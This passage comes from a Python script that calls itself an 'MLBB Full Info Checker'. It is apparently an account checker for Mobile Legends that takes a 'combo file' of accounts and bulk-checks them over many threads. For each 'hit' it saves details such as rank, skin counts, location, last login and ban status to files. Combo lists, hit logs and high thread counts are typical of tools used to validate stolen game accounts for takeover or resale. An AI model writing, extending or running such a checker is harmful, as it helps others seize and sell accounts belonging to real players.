            output_lines.append(f"Account ID: {account_id}")
            output_lines.append(f"Zone ID: {zone_id}")
            output_lines.append("Status: REGISTERED")
            output_lines.append("Lookup: success")
            output_lines.append("")
            output_lines.append("PLAYER INFO:")
            output_lines.append(f"Nickname: {player_data.get('nickname', 'Unknown')}")
            output_lines.append(f"Level: {player_data.get('level', 'Unknown')}")
            output_lines.append(f"Heroes: {player_data.get('hero_count', 0)}")
            output_lines.append(f"Skins: {player_data.get('skin_count', 0)}")
            output_lines.append(f"Current Rank: {player_data.get('current_rank', 'Unknown')}")
            output_lines.append(f"Highest Rank: {player_data.get('high_rank', 'Unknown')}")
            output_lines.append(f"Collector: {player_data.get('collector_tier', 'No Tier')}")
            output_lines.append(f"Collector Pts: {player_data.get('collector_point', 0)}")
            output_lines.append(f"Ban Status: False")
            output_lines.append(f"Location: {player_data.get('location', 'NOT FOUND')}")
            output_lines.append(f"Last Login: {player_data.get('last_login', 'N/A')}")
            output_lines.append(f"Creation Date: {player_data.get('creation_date', 'N/A')}")
            
            skin_bd = player_data.get("skin_breakdown", {})
            if skin_bd:
                output_lines.append("Skin Breakdown:")
                tier_order = ["Supreme Skins", "Grand Skins", "Exquisite Skins", "Deluxe Skins", "Exceptional Skins", "Common Skins"]
                for tier in tier_order:
                    cnt = skin_bd.get(tier, 0)
                    output_lines.append(f"  {tier}: {cnt}")
            
            output_text = "\n".join(output_lines)
            
            with results_lock:
                hit_counter += 1
                current_num = hit_counter
                v2l_status = player_data.get('v2l_status', 'N/A')
                if str(v2l_status).strip().lower() in ("yes", "1", "true", "enabled"):
                    v2l_yes_count += 1
                else:
                    v2l_no_count += 1
                ban_true_count += 0
                ban_false_count += 1
                tier_key = _get_major_tier(player_data.get("collector_tier", ""))
                if tier_key in collector_stats:
                    collector_stats[tier_key] += 1
                else:
                    collector_stats["Other"] += 1
            
            save_line(VALID_FILE, output_text + "\n" + "-" * 70)
            save_line(ALL_HITS_FILE, output_text + "\n" + "-" * 70)
            
            print_hit_line(str(account_id), device_id[:20], player_data.get("skin_count", 0), player_data.get("collector_tier", "N/A"), current_num)
            
            with results_lock:
                valid_results.append({'output': output_text})
            
            return {'status': 'success'}
        else:
            error_msg = result.get('error', 'Unknown error')
            save_line(ERROR_FILE, f"Device ID: {device_id} | Account ID: {account_id} | Zone ID: {zone_id} | ERROR: {error_msg}")
            return {'status': 'error'}
            
    except Exception as e:
        save_line(ERROR_FILE, f"Device ID: {device_info.get('device_id', '?')} | EXCEPTION: {str(e)}")
        return {'status': 'error'}


def run_bulk_check():
    """Original bulk check from combo file."""
    global valid_results, error_results, hit_counter, DEBUG_MODE, status_line_started
    DEBUG_MODE = False

    print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}  BULK CHECK MODE (combo file){Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")

    if len(sys.argv) >= 2:
        input_file = sys.argv[1]
    else:
        input_file = input(f"{Fore.CYAN}Drag combo file: {Style.RESET_ALL}").strip().replace('"', '')

    if not os.path.exists(input_file):
        print(f"{Fore.RED}Error: File '{input_file}' not found!{Style.RESET_ALL}")
        return

    accounts = []
    skipped  = 0
    with open(input_file, 'r', encoding='utf-8') as f:
        lines = [l.strip() for l in f if l.strip()]

    for line in lines:
        info = parse_account_line(line)
        if info:
            info['original_line'] = line
            accounts.append(info)
        else:
            skipped += 1

    if not accounts:
        print(f"{Fore.RED}No valid accounts found.{Style.RESET_ALL}")
        return

    valid_results = []
    error_results = []
    hit_counter   = 0
    file_counters.clear()
    global v2l_yes_count, v2l_no_count, ban_true_count, ban_false_count, processed_count
    v2l_yes_count  = 0
    v2l_no_count   = 0
    ban_true_count = 0
    ban_false_count= 0
    processed_count= 0
    status_line_started = False
    for k in collector_stats:
        collector_stats[k] = 0

    total = len(accounts)
    print(f"{Fore.GREEN}Loaded   : {total} accounts{Style.RESET_ALL}")
    if skipped:
        print(f"{Fore.YELLOW}Skipped  : {skipped} unparseable lines{Style.RESET_ALL}")
    print()

    try:
        max_threads = int(input(f"{Fore.CYAN}Threads (default 50): {Style.RESET_ALL}").strip() or "50")
    except ValueError:
        max_threads = 50

    start_time = time.time()

    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = {
            executor.submit(lookup_and_save, account, i % max_threads + 1, total): account
            for i, account in enumerate(accounts)
        }
        for future in as_completed(futures):
            try:
                future.result(timeout=120)
            except Exception as e:
                print(f"\n{Fore.RED}Thread error: {e}{Style.RESET_ALL}", flush=True)
            with results_lock:
                processed_count += 1
                _pc = processed_count
                _vy = v2l_yes_count
                _vn = v2l_no_count
                _bt = ban_true_count
                _bf = ban_false_count
                _ah = hit_counter
            print_processing_status(_pc, total, _vy, _vn, _bt, _bf, _ah)

    total_time = time.time() - start_time
    print_final_summary(total_time, total)

    input(f"\n{Fore.CYAN}Press ENTER to return to menu...{Style.RESET_ALL}")


def show_menu():
    print(f"\n{Fore.CYAN}{'─'*70}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}  MAIN MENU{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'─'*70}{Style.RESET_ALL}")
    print(f"  {Fore.YELLOW}[1]{Style.RESET_ALL} {Fore.WHITE}Device Check         {Fore.MAGENTA}(single device ID format){Style.RESET_ALL}")
    print(f"  {Fore.YELLOW}[2]{Style.RESET_ALL} {Fore.WHITE}Bulk Device Check    {Fore.CYAN}(process multiple devices){Style.RESET_ALL}")
    print(f"  {Fore.YELLOW}[3]{Style.RESET_ALL} {Fore.WHITE}Check Bulk (combo)   {Fore.CYAN}(process combo file){Style.RESET_ALL}")
    print(f"  {Fore.YELLOW}[4]{Style.RESET_ALL} {Fore.WHITE}Add Device IDs       {Fore.CYAN}(add device IDs to use){Style.RESET_ALL}")
    print(f"  {Fore.YELLOW}[0]{Style.RESET_ALL} {Fore.WHITE}Exit{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'─'*70}{Style.RESET_ALL}")
    return input(f"{Fore.CYAN}Select option: {Style.RESET_ALL}").strip()


def run_add_device_ids():
    """Add device IDs to use for checking."""
    global DEVICE_IDS
    
    print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}  ADD DEVICE IDs{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")
    
    print(f"{Fore.YELLOW}Current Device IDs: {len(DEVICE_IDS)} loaded{Style.RESET_ALL}")
    print(f"{Fore.WHITE}Enter Device IDs (one per line, type 'done' when finished):{Style.RESET_ALL}")
    print(f"{Fore.WHITE}Format: and_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx...{Style.RESET_ALL}")
    print()
    
    new_ids = []
    while True:
        line = input().strip()
        if line.lower() == 'done':
            break
        if line and line.startswith('and_'):
            new_ids.append(line)
            print(f"{Fore.GREEN}Added: {line[:30]}...{Style.RESET_ALL}")
        elif line:
            print(f"{Fore.RED}Invalid format (must start with 'and_'): {line}{Style.RESET_ALL}")
    
    if new_ids:
        DEVICE_IDS.extend(new_ids)
        print(f"\n{Fore.GREEN}Added {len(new_ids)} device IDs. Total: {len(DEVICE_IDS)}{Style.RESET_ALL}")
    else:
        print(f"\n{Fore.YELLOW}No new device IDs added.{Style.RESET_ALL}")
    
    input(f"\n{Fore.CYAN}Press ENTER to return to menu...{Style.RESET_ALL}")


def main():
    global valid_results, error_results, hit_counter

    print(f"{Fore.GREEN}")
    for line in [
        r"███    ███ ██           ██████ ██   ██ ███████  ██████ ██   ██ ███████ ██████  ",
        r"████  ████ ██          ██      ██   ██ ██      ██      ██  ██  ██      ██   ██ ",
        r"██ ████ ██ ██          ██      ███████ █████   ██      █████   █████   ██████  ",
        r"██  ██  ██ ██          ██      ██   ██ ██      ██      ██  ██  ██      ██   ██ ",
        r"██      ██ ███████      ██████ ██   ██ ███████  ██████ ██   ██ ███████ ██   ██ ",
    ]:
        print(line)
    print(f"{Style.RESET_ALL}")
    print(f"{Fore.GREEN} MLBB Full Info Checker - BY BULET PH{Style.RESET_ALL}")
    print(f"{Fore.YELLOW} Save folder: {OUTPUT_DIR}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW} Device IDs loaded: {len(DEVICE_IDS)}{Style.RESET_ALL}")
    if not DEVICE_IDS:
        print(f"{Fore.RED}⚠️  No Device IDs loaded! Use option 4 to add them.{Style.RESET_ALL}")

    while True:
        choice = show_menu()

        if choice == "1":
            run_device_check()
        elif choice == "2":
            run_bulk_device_check()
        elif choice == "3":
            run_bulk_check()
        elif choice == "4":
            run_add_device_ids()
        elif choice in ("0", "q", "exit"):
            print(f"{Fore.GREEN}Bye!{Style.RESET_ALL}")
            sys.exit(0)
        else:
            print(f"{Fore.RED}Invalid option. Please choose 1, 2, 3, 4, or 0.{Style.RESET_ALL}")


if __name__ == "__main__":
    main()
